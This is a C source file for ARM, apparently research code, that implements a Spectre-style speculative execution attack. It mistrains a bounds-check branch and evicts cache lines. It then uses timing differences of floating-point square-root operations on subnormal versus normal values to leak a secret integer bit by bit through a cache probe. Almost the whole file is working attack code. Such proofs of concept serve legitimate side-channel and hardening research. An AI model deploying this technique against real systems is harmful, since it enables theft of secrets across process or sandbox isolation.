#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <arm_neon.h>
#include "timing.h"
#include "cache.h"
#include <assert.h>
#include <string.h>
// #include <x86intrin.h>
// #include <xmmintrin.h>

#define FAST 0x40f0000000000000
#define SLOW 0x0010deadbeef1337
#define SIZE 256
#define STRIDE 512

int leakValue(int bit);


uint64_t global_variable __attribute__((aligned(2048))) = 0xbeefbeef;
static uint8_t array[SIZE * STRIDE] __attribute__((aligned(2048)));
cache_ctx_t arr_context __attribute__((aligned(2048)));
cache_ctx_t global_variable_context __attribute__((aligned(2048)));
cache_ctx_t secret_context __attribute__((aligned(2048)));


int secret __attribute__((aligned(2048)))= 0xdeadbabe ;

//32 MB = 32 * 2^20 = 2 ^ 5 * 2^20 = 2^25

//big_array has to be this size!
//static uint32_t big_array[33554432] __attribute__((aligned(128)));

void victim_function(register int secret_val, register int bit, int isPublic)
{
    // for (volatile int i = 0; i < 1000; i++);
    //memory_fence();
    //memory_access(&global_variable);


    if (isPublic < array[0x2 * STRIDE]) {
        //uint64_t tmp = ((secret >> bit) & 1) ? FAST : SLOW;
        uint64_t tmp = (((secret_val >> bit) & 1) * FAST) + (!((secret_val >> bit) & 1)* SLOW);
        //uint64_t tmp = ((secret >> bit) & 1) ? FAST : SLOW;

        double tmp2;
        memcpy((void*)&tmp2, (void *)&tmp, sizeof(tmp2));

        // USLH will harden this operation
        //volatile double tmp2 = tmp * tmp;
        
        asm volatile ("fmov d0, %x0" :: "r"(tmp2));


        asm volatile (
            // "1: \n"  // Label for the loop start
            ".rept 3\n\t"  // Repeat the following instructions ? times
            "fsqrt d0, d0\n\t"  // Compute the square root of the double-precision value in d0
            "fmul d0, d0, d0\n\t"  // Multiply the value in d0 by itself
            ".endr\n\t"
        );
        /*
        asm volatile (
            ".rept 60\n\t"  // Compute the square root of the double-precision value in d0
            "nop\n\t"
            ".endr\n\t"
        );
        */
        
        asm volatile ("fmov %0, d0" : "=r"(tmp2));
        asm volatile (
          "mov %0, %1"  // Move the value from the source register (%1) to the destination register (%0)
          : "=r" (tmp)    // Output operand: b will receive the value from the source register
          : "r" (tmp2)     // Input operand: a is the source register
          :             // No clobbered registers
          );
        void * addr = &global_variable;
        addr = addr + tmp;
        addr = addr - tmp;
        memory_access(addr);

  }

  return ;
}



// cache removal contexts for array2
cache_ctx_t * array_ctx = NULL;
size_t training_offset;

void setup(){
    for (int i = 0; i < sizeof(array); i++)
        array[i] = 0x0;
    array[0x2 * STRIDE] = 10;

    arr_context = cache_remove_prepare(&array[0x2 * STRIDE]);
    global_variable_context = cache_remove_prepare(&global_variable);
    secret_context = cache_remove_prepare(&secret);

    return;
}


int leakValue(int bit){


    int num_hits = 0 ;

    memory_fence();
    
    // mistrain + access out of bounds
     
    for(int i = VICTIM_CALLS; i >= 0; i--){ // do VICTIM_CALLS calls to the victim function (per measurement)
        
        // in-bounds or out of bounds
        // this is leak_offset every TRAINING + 1 iterations and training_offset otherwise
        // we try to avoid branches, so it is written that way.
        // size_t x = (!(i % (TRAINING + 1))) * (leak_offset - training_offset) + training_offset;
        //int x = (i == 0) ? 0 : 10;
        int x = (i == 0) * 10;
        
        // remove array_size from cache
        //cache_remove(array2_ctx[VALUES]);
        cache_remove(arr_context);
        cache_remove(global_variable_context);
        //cache_remove(secret_context);

        //make sure everything is removed from cache
        memory_fence();

        // call to vulnerable function.
        // Either training (in-bound) or attack (out-of-bound) call.
        // If this is an attack call and the mistraining was successful, an entry of array2 will be cached
        //  directly dependend on the entry in array1 we want to leak!
        //printf("%d, %d\n", i, x);
        victim_function(secret, bit, x);
        memory_fence();

     //noops
    //asm volatile (".rept 5000;\nnop;\n.endr;");
    }
        
    // measurement
    
    // measure access time to each entry in array2.
    // increment cache_hits at the corresponding position on cache hit.
    uint64_t time;

    // measure time
    //memory_access(&global_variable);
    time = probe(&global_variable);
   
    //assert(time != 0);
    num_hits += (time); // && time makes sure the time wasn't 0 (0 = the timer is not running)
    
    
    // return offset of array2 with most cache hits 
    // (should be the value read from out-of-bound access to array1 during mis-speculation)
    return num_hits;
}


int main(int argc, char *argv[])
{
  timer_start();

  //printf("[Spectre Variant %d for Variable Time Instructions]\n", VARIANT);

  secret = atoi(argv[1]);
  int guess = 0;

  uint64_t result[32] = {0};

  memory_fence();

  //puts(" ---- SETUP ---- ");
  //fflush(stdout);
      
  setup();

  memory_fence();


  for (volatile int i = 0; i < 32; i++) {
    result[i] = leakValue(i);
  }
  
  for (int i = 0; i < 32; i++)
    printf("%3lld ", result[i]);
  //printf("Guess : %3d, --> %d\n", guess, guess == secret ? 1 : 0);

    timer_stop();

}

